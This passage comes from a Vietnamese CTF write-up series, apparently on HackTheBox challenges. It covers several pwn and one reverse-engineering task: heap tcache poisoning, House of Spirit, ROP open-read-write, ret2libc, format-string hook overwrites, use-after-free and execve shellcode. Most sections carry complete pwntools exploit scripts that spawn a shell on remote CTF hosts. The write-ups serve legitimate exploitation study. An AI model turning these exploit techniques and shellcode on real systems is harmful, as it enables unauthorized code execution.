    SYMTAB_struct, #a40 #a48 #a50
    0, 0,          #a58 #a60 #padding
    JMPREL_struct, #a68 #a70
    b'system\0\0', #a78
    b'/bin/sh\0'   #a80
)

p.send(payload)

p.interactive()
```


-------

27 . Behind the Scenes (rev)
------

1 bài rev ở mức very nói về SIGILL (Illegal instruction)



chạy thử thì nó yêu cầu password

![image](https://hackmd.io/_uploads/S1lVhG-zJx.png)


nhập đại thì nó thoát luôn :(


dùng strings thì cũng không thấy điều gì hữu ích 

![image](https://hackmd.io/_uploads/BkSwnfWGJx.png)






strace thử cũng chưa thấy gì 

![image](https://hackmd.io/_uploads/B1kA3M-M1l.png)


ltrace thì có đọan bị 

```
--- SIGILL (Illegal instruction) ---
--- SIGILL (Illegal instruction) ---
```

sau khi tìm hiểu thì thằng này do lệnh ud2 gây ra ud2 được sử dụng để tạo mã lệnh không hợp lệ, thường được sử dụng trong thử nghiệm phần mềm để cố ý tạo ngoại lệ.
![image](https://hackmd.io/_uploads/SkWg6zWfkl.png)

1 VÀI THÔNG TIN VỀ ud2

```

Tạo ra một opcode không hợp lệ. Hướng dẫn này được cung cấp để kiểm tra phần mềm nhằm tạo ra một opcode không hợp lệ một cách rõ ràng. Mã hoạt động của lệnh này được dành riêng cho mục đích này.

Ngoài việc đưa ra ngoại lệ opcode không hợp lệ, lệnh này giống với lệnh NOP.
```

ta có 2 hướng , 1 là mở IDA và tìm trong strings , 2 là thay các lệnh UD2 thành NOP :v 

![image](https://hackmd.io/_uploads/HyTgZ7Zfyx.png)


HTB{Itz_0nLy_UD2}

--------


28 . Hellhound(House of spirit)
-------

1 bài sau khi làm xong thì mình đọc thì thấy bảo là 1 dạng của house trong heap


- oke mỗi PIE là tắt

![image](https://hackmd.io/_uploads/HJAlQ6ZM1l.png)


code sẽ như sau : 

ta thấy đầu tiên nó sẽ malloc 1 chunk 0x40 , sau đó sẽ bắt ta nhập các option 

:::info
option1 : nó sẽ in địa chỉ stack chứa thằng heap đó
:::

:::info
option2 : cho ta read vào chunk heap
:::

:::info
option3 : nó sẽ gán dữ liệu của thằng chunk+8byte cho thằng heap hiện tại 
:::

:::info
option69 : break ra khỏi vòng lặp
:::


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  void *buf[9]; // [rsp+8h] [rbp-48h] BYREF

  buf[8] = (void *)__readfsqword(0x28u);
  setup();
  banner();
  buf[0] = malloc(0x40uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          printf(aInteractionWit, argv);
          num = read_num();
          if ( num != 2 )
            break;
          printf("\n[*] Write some code: ");
          argv = (const char **)buf[0];
          read(0, buf[0], 0x20uLL);
        }
        if ( num > 2 )
          break;
        if ( num != 1 )
          goto LABEL_13;
        argv = (const char **)buf;
        printf("\n[+] In the back of its head you see this serial number: [%ld]\n", buf);
      }
      if ( num != 3 )
        break;
      buf[0] = *((void **)buf[0] + 1);
      argv = (const char **)"\x1B[1;31m";
      printf("%s\n[-] The beast went Berserk again!\n", "\x1B[1;31m");
    }
    if ( num == 69 )
      break;
LABEL_13:
    argv = (const char **)"\x1B[1;31m";
    printf("%s\n\n[-] Invalid option!\n", "\x1B[1;31m");
  }
  free(buf[0]);
  printf("%s[*] The beast seems quiet.. for the moment..\n", "\x1B[1;31m");
  return 0;
}
```

ngoài ra trong file binary cũng chứa 1 hàm , hàm này có lẽ là hàm win của ta

![image](https://hackmd.io/_uploads/rkcbBabGyx.png)


- vậy ý tưởng khá rõ ràng , ta có thể ghi địa chỉ stack chứa RIP vào chunk + 8 và dùng option3 để thay đổi buf , sau đó ghi dữ liệu vào sẽ là hàm win 

- tuy nhiên sẽ có 1 vấn đề xảy ra , sau khi chọn option69 , nó sẽ free chunk đó , mà chunk đó lúc này lại chứa thằng stack của ta nên nó sẽ không hợp lệ , vì vậy ta cần phải gán thằng đó bằng NULL sẽ không bị lỗi

script 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./hellhound_patched',checksec=False)
libc = ELF('./hellhound',checksec=False)
ld = ELF('./ld-2.23.so',checksec=False)
#p = process()
p = remote('94.237.62.166',46869)
#gdb.attach(p,gdbscript='''
#           b*main+76
#           b*main+184
#           b*main+140
#           b*0x0000000000400D86
#           b*main+202
#           ''')
input()


p.sendlineafter(b'>> ',b'1')
p.recvuntil(b' [')
leak = int((p.recvuntil(b']')[:-1]).decode())

log.info(f"leak: {hex(leak)}")

p.sendlineafter(b'>> ',b'2')
p.sendafter(b'some code: ',b'a'*8 + p64(leak+0x50))


p.sendlineafter(b'>> ',b'3')

p.sendlineafter(b'>> ',b'2')
p.sendafter(b'some code: ',p64(exe.sym.berserk_mode_off) + p64(0))

p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'>> ',b'69')



p.interactive()
```

nói thêm vài điều : 

Chúng ta đang ở trong libc.2-23.so , điều đó có nghĩa là có một sự kiểm tra đối với bất kỳ thứ gì free() đang lấy làm đầu vào,
Có nghĩa là nếu nó không phải là địa chỉ heap, nó sẽ thoát ra với lỗi. Vì vậy, điều chúng ta phải làm là tạo ra một
đoạn giả để lừa free() . Như chúng tôi đã đề cập trước đó, đoạn giả phải có cấu trúc sau:

```
def overwrite(payload):
sla(">", "2")
sla(":", payload)
sla(">", "3")

# Overwrite buf address with return address
info("Overwrite stack address with return address (0x{:x} ->
0x{:x})".format(stack_addr, ret))
overwrite(p64(0xdeadbeef) + p64(ret))

# Overwrite return address with reborn and set a fake chunk
info("Overwrite return address with sell_soul and create a fake chunk at:
0x{:x} (0x{:x} -> 0x{:x})".format(bss-0x8, ret, e.sym.sell_soul))
overwrite(p64(e.sym.sell_soul) + p64(bss-0x8))

# Overwrite fake chunk's size with a valid size
info("Overwrite fake chunk's size at 0x{:x} with 0x61 bytes..".format(bss-0x8))
overwrite(p64(0x61) + p64(bss+0x58))

# Overwrite Top chunk's size with a valid size
info("Overwrite Top chunk's size at 0x{:x} with 0x20d61
bytes".format(bss+0x58))
overwrite(p64(0x20d61) + p64(bss))
```

:::success
ta có thể thấy đầu tiên ta sẽ ovwrite retadd trước , sau đó địa chỉ tiếp theo là 1 vùng bss(1 vùng có thể write) ,  ghi size + bit vào (0x61) , tiếp theo đó là 1 vùng bss nữa (bss+0x58) , ta sẽ fake size của top chunk -> đây là cách thứ 2 của bài 
:::


xem thêm ở đây : 

https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

![image](https://hackmd.io/_uploads/Symm_pbGJe.png)

-------


29 . Bon-nie-appetit (off-by-one , overlapping , tcache poisoining)
--------


- 1 bài thuộc dạng Off-by-one. Overlapping chunks. Tcache poisoning



bài sẽ có các option sau: 

![image](https://hackmd.io/_uploads/rJgCYs4GfJl.png)


option 1 : 

nó phân bổ các chunk dựa trên size đã nhập , sẽ không có lỗi ở hàm này 

![image](https://hackmd.io/_uploads/ByIk2EGfJx.png)

hàm này sẽ check ta chỉ được phân bổ 20 chunk và chunk đó đã được phân bổ chưa 

![image](https://hackmd.io/_uploads/HJk8TNMG1l.png)


option 2 : nó cũng check idx mà ta nhập vào , và in dữ liệu ở chunk đó ra 

![image](https://hackmd.io/_uploads/r1-KANfzyl.png)


option 3 : check size , và dùng strlen() để lấy độ dài của dữ liệu trong chunk , bug sẽ xuất hiện ở đây , strlen() sẽ lấy đến khi nào gặp bytes NULL , tuy nhiên khi nhập full byte với chunk đó , nó sẽ lấy được đến prev size của chunk kế tiếp , nghĩa là lấy được size của chunk hiện tại + 1 , vậy ta có thể sửa dc prev size của chunk kế tiếp 


![image](https://hackmd.io/_uploads/H1IsR4Mz1g.png)


option4 : free chunk với idx nhập vào và gán NULL luôn nên sẽ kh có lỗi gì ở đây

![image](https://hackmd.io/_uploads/SJbryrGzJe.png)


hmmmmm , bài này có lẽ chỉ khai thác được 1 lỗi , tuy nhiên 1 là quá đủ =))) , à hình như còn cái  size nhập tùy ý nữa


full giáp :>
![image](https://hackmd.io/_uploads/B10tyHfMJl.png)

- ý tưởng của mấy bài heap có lẽ là cần leak libc , vậy ta sẽ tìm cách leak bằng cách tạo 1 chunk và free() vào Ubin , fd và bk trong UBIN sẽ chứa địa chỉ libc
```
chunk0 ->>>>  0x450 , b'a'
chunk1 ->>>>  0x100 , b'a'  (chunk này để tránh khi free() thằng chunk0 sẽ bị gộp chunk)
```


ở đây vì free xong thì nó xóa con trỏ luôn nên sẽ kh dùng hàm show được , ta phải leak bằng cách tạo lại 1 chunk với size đó và kh nhập gì , hoặc nhập 1 byte cũng dc , quan trọng là leak được 

nó sẽ trông như sau : 

```
make(0x428, b'A') # size field 0x430
make(24, b'B')
delete(0) # delete chunk idx 0
delete(1) # delete chunk idx 1
make(0x428, b'')
show(0)
```


libc 2.27 nên ta sẽ vẫn dùng dc mấy hàm hook (libc>=2.34 trở lên sẽ bị fix)

![image](https://hackmd.io/_uploads/rk2sgrMGyg.png)

- lúc này ta sẽ tận dụng lại bug ở strlen() , ta sẽ tạo những chunk chồng chéo nhau 

nói thì khó hình dung nhưng nó sẽ như sau : 

A -> B -> C

vd : 3 thằng này đều là 0x40  , ta sẽ edit thằng A và ta one_off_byte được thằng B , ta sẽ ghi đè 1 byte với size lớn , size lớn đó sẽ dùng để overwrite thằng C , và thực chất là thay đổi fd của mấy thăng này (như kiểu tcache ponisioning)

nó sẽ như sau : 

```
make(0x28, b'X' * 0x28) # allocate new data at chunk 0
make(0x28, b'Y' * 0x28) # allocate new data at chunk 1
make(0x28, b'Z' * 0x28) # allocate new data at chunk 2

edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size field of chunk 2 to 0x81
input()
delete(1) # remove data at chunk 1
delete(2) # remove data at chunk 2
```

lúc này size thằng B là 0x81 , khi free thì chương trình vẫn giữ với cái size đó , trong bins thì thằng B trỏ đến thằng C (B->C)

- khi malloc lại thì ta sẽ ghi đè thằng C bằng hàm hook đó (B-Hook) , vậy nó sẽ như sau 

```
make(0x78, b'D' * 0x28 + pack(0x21) + p64(libc.sym['__free_hook']))
make(0x28, b'/bin/sh\x00') # store /bin/sh strings as FD of chunk 2
make(0x28, p64(libc.sym['system'])) # change _free_hook to system()

delete(2) # trigger overwritten __free_hook() --> system("/bin/sh").
```
malloc đầu tiên là ghi đè thằng C , malloc thứ 2 là phân bổ 1 chunk rác (để /bin/sh  tí free lấy shell luôn)

malloc thứ ba là ghi thằng hook bằng system

lúc này free_hook là system nên chỉ cần gọi free() với chunk chứa chuỗi /bin/sh -> get flag :100: 

script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bon-nie-appetit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
sh = remote('83.136.252.14',35324)
#gdb.attach(sh,gdbscript='''
#           b*new_order+127
#           b*new_order+211
#           b*edit_order+215
#           b*delete_order+156
#           b*show_order+123
#           b*edit_order+173
#           ''')

def make(size, data):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(size))
    sh.sendlineafter(b':', data)

def show(index):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', str(index))

def edit(index, data):
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b':', str(index))
    sh.sendlineafter(b':', data)

def delete(index):
    sh.sendlineafter(b'>', b'4')
    sh.sendlineafter(b':', str(index))

def finalize():
    sh.sendlineafter(b'>', b'5')

make(0x428, b'A') # size field 0x430
make(24, b'B')
delete(0) # delete chunk idx 0
delete(1) # delete chunk idx 1
make(0x428, b'')
show(0)

sh.recvuntil(b"=> ")
get = u64(sh.recv(6) + b'\x00' * 2)
log.info(f'libc leak --> {hex(get)}')

libc.address = get - 4111370
log.success(f'LIBC BASE --> {hex(libc.address)}')

delete(0) # remove data at chunk 0
make(0x28, b'X' * 0x28) # allocate new data at chunk 0
make(0x28, b'Y' * 0x28) # allocate new data at chunk 1
make(0x28, b'Z' * 0x28) # allocate new data at chunk 2

edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size field of chunk 2 to 0x81
input()
delete(1) # remove data at chunk 1
delete(2) # remove data at chunk 2

# overlap size field of chunk 2 to 0x21 and change it's FD to __free_hook()
make(0x78, b'D' * 0x28 + pack(0x21) + p64(libc.sym['__free_hook']))
make(0x28, b'/bin/sh\x00') # store /bin/sh strings as FD of chunk 2
make(0x28, p64(libc.sym['system'])) # change _free_hook to system()

delete(2) # trigger overwritten __free_hook() --> system("/bin/sh").

sh.interactive()
```

---------


30 . Finale (ROP ORW)
------


- 1 bài ret2libc bình thường , tuy nhiên  sau khi làm xong thì ý đồ của author ở bài này là dùng ROP orw 



reverse : 

nhập random vào buf , nếu chuỗi nhập vào là "s34s0nf1n4l3b00" thì gọi hàm  finale() 

```

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[8]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v5; // [rsp+8h] [rbp-38h]
  int v6; // [rsp+10h] [rbp-30h]
  __int64 buf[2]; // [rsp+20h] [rbp-20h] BYREF
  int fd; // [rsp+34h] [rbp-Ch]
  unsigned __int64 i; // [rsp+38h] [rbp-8h]

  banner(argc, argv, envp);
  buf[0] = 0LL;
  buf[1] = 0LL;
  fd = open("/dev/urandom", 0);
  read(fd, buf, 8uLL);
  printf("\n[Strange man in mask screams some nonsense]: %s\n\n", (const char *)buf);
  close(fd);
  *(_QWORD *)s1 = 0LL;
  v5 = 0LL;
  v6 = 0;
  printf("[Strange man in mask]: In order to proceed, tell us the secret phrase: ");
  __isoc99_scanf("%16s", s1);
  for ( i = 0LL; i <= 0xE; ++i )
  {
    if ( s1[i] == 10 )
    {
      s1[i] = 0;
      break;
    }
  }
  if ( !strncmp(s1, "s34s0nf1n4l3b00", 0xFuLL) )
    finale();
  else
    printf("%s\n[Strange man in mask]: Sorry, you are not allowed to enter here!\n\n", "\x1B[1;31m");
  return 0;
}
```

 finale  : 
 
 thấy ngay BOF và các gadget như pop_rdi , pop_rsi đồ cũng có luôn nên nghĩ đến hướng ret2libc , tuy nhiên ta sẽ thử làm ROP orw thử
 
 ![image](https://hackmd.io/_uploads/HJlkhmqzke.png)

ở đây ta thấy được ta không có quyền điều khiển RDX

![image](https://hackmd.io/_uploads/SJ0GhXqfJl.png)

1 điều cần chú ý là bài cho ta địa chỉ của STACK , cái này dùng để nhập chuỗi flag.txt  và lấy địa chỉ đó thôi , nếu kh cho thì read chuỗi  đó vào bss cũng được vì có hàm read các kiểu 

- quay lại vấn đề RDX

đặt bp ở RET của hàm ```finale``` , ta thấy được nó được setup sẵn ở đoạn write nên ý tưởng của ta sẽ không gặp vấn đề 

![image](https://hackmd.io/_uploads/rybT37cz1g.png)


![image](https://hackmd.io/_uploads/Sk_ihm9Mkx.png)

- Vấn đề tiếp theo nữa là không có gadget syscall thì sao open , read , write đồ được ?? 


nhìn vào đây ta thấy chương trình có sẵn các hàm này rồi -> ta chỉ cần setup các REG cho đúng và thực thi thôi

![image](https://hackmd.io/_uploads/BJ6gaX5fkl.png)

vì dễ nên để script ở đây luôn :v  

ta sẽ setup ở đầu stack là chuỗi flag.txt , xong khi open() thì bỏ nó vào RDI , RSI sẽ là 0

read thì setup (3,addr,0x54) , write thì tương tự

script : 

```
#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, ROP, sys

context.binary = elf = ELF('finale_patched')


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'In order to proceed, tell us the secret phrase: ', b's34s0nf1n4l3b00')

    p.recvuntil(b'Season finale is here! Take this souvenir with you for good luck: [')
    addr = int(p.recvuntil(b']').decode()[:-1], 16)

    rop = ROP(elf)
    pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]

    fd = 3
    offset = 72

    payload  = b'flag.txt'
    payload += b'\0' * (offset - len(payload))

    payload += p64(pop_rdi_ret)
    payload += p64(addr)
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(elf.plt.open)

    payload += p64(elf.sym.finale)

    p.sendlineafter(b'Now, tell us a wish for next year: ', payload)

    payload  = b'A' * offset

    payload += p64(pop_rdi_ret)
    payload += p64(fd)
    payload += p64(pop_rsi_ret)
    payload += p64(addr)
    payload += p64(elf.plt.read)

    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_ret)
    payload += p64(addr)
    payload += p64(elf.plt.write)

    p.sendlineafter(b'Now, tell us a wish for next year: ', payload)
    p.recvline()
    p.recvline()
    p.recvline()
    print(p.recvline())
    p.close()


if __name__ == '__main__':
    main()
```

còn đây là payload  ret2libc 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./finale_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process()
p = remote('83.136.254.158',43618)
p.sendlineafter(b'phrase: ',b's34s0nf1n4l3b00')
p.recvuntil(b'luck: [')

leak = int(p.recvuntil(b']')[:-1],16)
print("leak: ",hex(leak))
pop_rdi  = 0x00000000004011f2

payload = b'a'*64
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(0x0000000000401315)
p.send(payload)

p.recvuntil(b'you!')
p.recvlines(2)
leak_2 = u64(p.recv(6).ljust(8,b'\x00'))
print("leak: ",hex(leak_2))

libc.address = leak_2 - 0x84420
print("libc: ",hex(libc.address))

payload2 = b'a'*72
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(pop_rdi+1)
payload2 += p64(libc.sym.system)
p.send(payload2)
p.interactive()
```



-------

31 . Format (fsb)
------

- 1 bài fmt khá hay , dùng 1 số lượng lớn byte in ra để thằng malloc xử lí và get_shell



revese : 

bài rất đơn giản , 1 vòng loop vô hạn và bug fmt ở đây luôn



![image](https://hackmd.io/_uploads/Bk92AQcfJg.png)

checksec : 

tuy nhiên đời không như là mơ , sau khi checksec thì thấy full giáp
![image](https://hackmd.io/_uploads/SkoJkV5fkg.png)


- vậy GOT không thể ghi đè ?? , làm sao get shell đây 


lúc trước mình có làm  1 bài heap tương tự , trick lỏ là ta sẽ dùng 1 số lượng lớn byte in ra ở format string và khi đó chương trình sẽ nhờ malloc()  để xử lí cái đống này , vậy ta chỉ cần overwrite __malloc_hook  thành one_gadget là được 

![image](https://hackmd.io/_uploads/SJqP1N9MJg.png)

- bài  này chỉ khó ở đoạn ta không biết overwrite vào  đâu , còn lại chỉ là basic FSB , trước tiên phải leak libc , path libc vào file giống với sever , tìm one_gadget và get_shell

còn 1 vấn  đề nữa là khi tìm địa chỉ libc rồi tuy nhiên tìm trên  libc.blukat.me  thì gặp 1 số vấn đề , vậy ta sẽ nhập địa chỉ GOT vào và dùng %$s để leak địa chỉ GOT tìm cho dễ (PIE bật nhưng ta có thể leak PIE trước rồi đến bước này )

script : 

```
#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./format_patched',checksec=False)
libc = ELF('./libc6_2.27-0ubuntu2_amd64.so')
#p = process()
p = remote('94.237.59.180',30416)
#gdb.attach(p,gdbscript='''
#           brva 0x00000000000011F1
#           ''')
p.sendline(b'%41$p|')
exe.address = int(p.recvuntil(b'|')[:-1],16) - 0x12b3

log.info(f"exe: {hex(exe.address)}")

payload  = b'%7$s'
payload = payload.ljust(8,b'\x00')
payload += p64(exe.got.printf)
p.sendline(payload)

p.recvline()
leak = u64(p.recv(6).ljust(8,b'\x00'))
print("leak: ",hex(leak))
libc.address = leak - libc.sym.printf
print("libc address: ",hex(libc.address))

og = [libc.address+x for x in [0x4f2be,0x4f2c5,0x4f322,0x10a38c]]
print(f"OG {[hex(x) for x in og]} ")
print("this is malloc_hook: ",hex(libc.sym.__malloc_hook))
wrties = {libc.sym.__malloc_hook : og[2]}
fmt = fmtstr_payload(6,wrties)
input()
p.sendline(fmt)
p.sendline(b'%900000c')


p.interactive()
```

đọc  thêm ở đây :  https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/

-------


31 . No Return
--------

reverse : 

- bài này không có 1 chức năng cụ thể nào , chỉ là những đoạn asm như bên dưới 
![image](https://hackmd.io/_uploads/HJmDVxsMkl.png)


- hoặc ta cũng có thể dùng lệnh ```objdump -M intel -d no-return``` để xem mã asm , vì thằng IDA nó tìm thấy entry point nên nó sẽ hiện như trên hình 


![image](https://hackmd.io/_uploads/ByX34lsGke.png)

- nhìn  vào IDA thì thấy có 2 đoạn SYSCALL , SYSCALL thứ nhất setup (rax=1,rdi=1,rsi=rsp,edx=8) đây là 1 syscall write , nó sẽ in địa chỉ ở RSI (là 1 địa chỉ stack) , tiếp theo là syscall read với setup (rax=0,rdi=0,edx=0xc0,rsi sẽ là RSP ở syscall trước)  , vậy nó sẽ read 0xC0 byte trong khi stack của ta chỉ có 0xB0 ,vì vậy sẽ có BOF 16 bytes ở đoạn này 


- ý tưởng : ở bài này nó là 1 file static , ban đầu được cho địa chỉ stack nên mình nghĩ ngay đến ret2shellcode tuy nhiên NX bật ở bài này , ta cũng không thể leak libc hay gì hết , vì có gadget syscall sẵn nên ta nghĩ đến thực thi execve() hoặc là SIG_return 




![image](https://hackmd.io/_uploads/S1ioSxjGyg.png)

- muốn dùng kĩ thuật SIG_return thì ta phải điều khiển được rax , thử tìm trong ROPgadget thì thấy ``` xchg rdx, rax ; fdivp st(1) ; jmp qword ptr [rcx]``` là dễ dùng nhất

- và ta cũng phải control được RDI , vậy thằng này
 ```xchg rdi, rcx ; std ; jmp qword ptr [rdx]``` sẽ hữu ích

![image](https://hackmd.io/_uploads/S1ISLgizke.png)


![image](https://hackmd.io/_uploads/rymiLeiMyg.png)


- tuy nhiên ta cũng phải control được ```rdx``` và ```rcx``` để control được ```rdi``` và ```rax```


- ta có thể control 2 thằng trên bằng gadget này 
```pop rdi ; pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1]``` tuy nhiên 1 vấn đề này ra nữa là nó sẽ jmp đến địa chỉ ở trong rdi+1 , nên sẽ khá khó để setup (rdi+1 phải là 1 địa chỉ hợp lệ )


- vì vậy ta sẽ suy nghĩ sang hướng khác là dùng ```SIG_return``` để setup  các ```REG``` cách này sẽ dễ hơn nhiều vì chỉ cần control rdx-> control rax


---------

32 . HacktheNote (UAF)
-------

1 baì heap với bug UAF 

- reverse

ở đây ta có 4 option nên ta sẽ phân tích từng cái luôn 

option 1 (```Add```) : 


- đầu tiên nó sẽ cho ta nhập 1 số và số này cũng chính là size của các chunk được phân bổ , giới hạn <=0x80  ta cần chú ý điểm này , phiên bản libc ở bài này dùng là 2.35 -> có tcache , và size tối đa của fastbin sẽ là 0x80

- tiếp theo nó check idx , ở đây idx tối đa là 9 , vậy ta sẽ allocate được 0-9 chunk

- tiếp theo nữa là read content vào chunk

![image](https://hackmd.io/_uploads/Bk6dczjz1g.png)


- option 2(```delete```) :

tương tự các bài khác là nó sẽ check idx cần free() , xong sẽ free() mà không xóa con trỏ -> xuất hiện bug UAF ở đây

![image](https://hackmd.io/_uploads/H1yynGsf1g.png)


- option3 (```show```) :

cũng như free thì thằng này check idx và in dữ liệu của chunk đó ra 
![image](https://hackmd.io/_uploads/BJzX3zsMyl.png)


- option 42 (```_```) : 

nhìn vào có vẻ rắc rối , tuy nhiên ta có thể debug trong GDB để thấy rõ hơn , cụ thể là nó sẽ chuyển chuỗi của a1 sang hex , mà ta để ý a1 chính là các chunk của ta , xong nó check xem có phải là địa chỉ không , nếu đúng thì nó gọi 1 con trỏ hàm với địa chỉ là chunk0 và đối số là chunk1 

![image](https://hackmd.io/_uploads/SkAH2fszyl.png)


- solution : 

ý tưởng bài này khá đơn giản , ta được alloc tận 10 chunk , tcache chỉ chứa 7 chunk cùng size -> ta sẽ allocate 8 chunk và free 8 chunk này , lúc này chunk thứ 8 sẽ lọt qua usorted_bin và ta có địa chỉ libc -> xong chỉ việc phân bổ llại2 chunk và điền địa chỉ libc với /bin/sh lần lượt vào chunk0-> chunk1 thõa mãn ```option 42```

1 điểm cần chú ý là tại sao khi ta free chunk thứ 8 nó không lọt vào fastbin là vì chunk này là 0x80 , khi malloc thì size nó sẽ là 0x90 nên nó sẽ lọt qua luôn =))

script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./deathnote_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.51.81',34050)


def create(size,idx,content):
    p.sendline(b'1')
    p.sendlineafter(b'request?',size)
    p.sendlineafter(b'Page?',idx)
    p.sendlineafter(b'victim:',content)
def free(idx):
    p.sendline(b'2')
    p.sendlineafter(b'Page?',idx)

def show(idx):
    p.sendline(b'3')
    p.sendlineafter(b'Page?',idx)

for i in range(-1,8,1):
    create(str(0x80),str(i+1),b'pl')

free(str(0))
free(str(1))
free(str(2))
free(str(3))
free(str(4))
free(str(5))
free(str(6))
free(str(7))
show(str(7))
offset = 0x21ace0
p.recvuntil(b'Page content: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak - offset
log.info(f"libc: {hex(libc.address)}")

create(str(0x80),str(0),hex(libc.sym.system))
create(str(0x80),str(1),b'/bin/sh\x00')
p.sendline(b'42')
p.interactive()
```

đọc rõ hơn ở đây : https://www.theflash2k.me/blog/writeups/htb-cyberapocalypse-24/pwn/deathnote

---------

33 . Regularity (ret2reg)
------

- 1 bài shellcode kết hợp gadget jmp 





bài chỉ có nhiêu đây thôi , thấy ngay BOF ở đây luôn

![image](https://hackmd.io/_uploads/rkJ9b_ozkl.png)


checksec : NX tắt -> dùng shellcode

![image](https://hackmd.io/_uploads/ryiob_iMke.png)

- và ta cũng biết rằng vì nó dùng syscall read , nên dữ liệu sẽ được ghi vào rsi 

![image](https://hackmd.io/_uploads/ryDefujzyx.png)


- điều cần quan tâm là sau khi read xong thì nó tăng rsp của ta lên 0x100 , và ta sẽ jmp đến cái rsp vừa dc tăng luôn nên ý tưởng sẽ là dùng 1 gadget jmp hoặc call (RSI) ghi đè thằng này 


script 

```
#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./regularity')

#p = process()
p = remote('83.136.254.60',52874)
#gdb.attach(p,gdbscript='''
#           b*0x40106e
#           ''')
jmp_rsi = 0x0000000000401041

shellcode = asm('''
                xor rdx,rdx
                mov rbx,29400045130965551
                push rbx

                mov rdi,rsp
                xor rsi,rsi
                mov rax,0x3b
                syscall
                ''')

payload = shellcode
payload = payload.ljust(256,b'\x00')
payload += p64(jmp_rsi)
input()
p.send(payload)

p.interactive()
```
![image](https://hackmd.io/_uploads/SkAUM_oGyl.png)


-------


34 . Writing on the Wall (BUG strcmp)
---------

1 bài khá hack não nếu kh nhận ra thằng strcmp , à mà source code nó chỉ có nhiêu đây thôi nên dễ nhận  ra


reverse :  ta thấy nó gán 1 đoạn hex 8 byte cho s2 , tiếp theo read vào buf 7 byte , xong so sánh 2 thằng này , nếu giống nhau thì gọi hàm open_door , hàm này sẽ chứa flag cho ta

![image](https://hackmd.io/_uploads/r1mzc_oG1l.png)

- target bài này rất rõ ràng , ta cần nhập 1 cái gì đó sao cho strcmp so sánh đúng thì lấy  flag , tuy nhiên có 1 vấn đề là buf chỉ chứa 6 bytes vậy khi read 7 byte thì nó sẽ one_off_byte thằng s2 , hmmmm....

- lưu ý cái byte ta cần nhập vào theo dạng little endian , ta có thể dùng b'' như này hoặc dùng hàm packing mà pwntools hỗ trợ 

- ở đây nó check 1 chuỗi 8 byte với 1 chuỗi 7 byte , nên không thể bypass được cái này 

- vậy nên ta sẽ phải check lại xem có thể khai thác được gì từ strcmp không , ở đây strcmp sẽ so sánh đến khi gặp kí tự NULL , ta cũng có thể overwrite 1 byte ở chuỗi thứ  2 , vậy ta chỉ cần nhập các byte NULL là oke

ở đây chỉ cần đầu chuỗi là byte NULL , nên các byte ở giữa có thể là những byte bất kỳ

script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./writing_on_the_wall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
#p = remote('94.237.59.180',34502)
p = process()
gdb.attach(p,gdbscript='''
           brva 0x00000000000015ac
           ''')
input()
p.send(b'\x00\x00\x00\x00\x00\x00\x00')

#p.send()
p.interactive()

```





--------

35 . Toxin(fsb + UAF HEAP)
------

- 1 bài format-strings + UAF , cái hay của bài này là dùng printf() để 1 số lượng lớn byte ra và nó sẽ gọi malloc() để xử lí , 1 ý tưởng rất hay mình mới phát hiện




reverse : 

1 bài với các OPTION như 1 những bài heap khác , ta sẽ phân tích từng option

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("Welcome to Toxin, a low-capacity lab designed to store, record and keep track of chemical toxins.");
  while ( 1 )
  {
    while ( 1 )
    {
      v3 = menu();
      if ( v3 != 4 )
        break;
      search_toxin();
    }
    if ( v3 > 4 )
    {
LABEL_12:
      puts("Lab code not implemented.");
    }
    else
    {
      switch ( v3 )
      {
        case 3:
          drink_toxin();
          break;
        case 1:
          add_toxin();
          break;
        case 2:
          edit_toxin();
          break;
        default:
          goto LABEL_12;
      }
    }
  }
}
```

option1 (```add_toxin```):


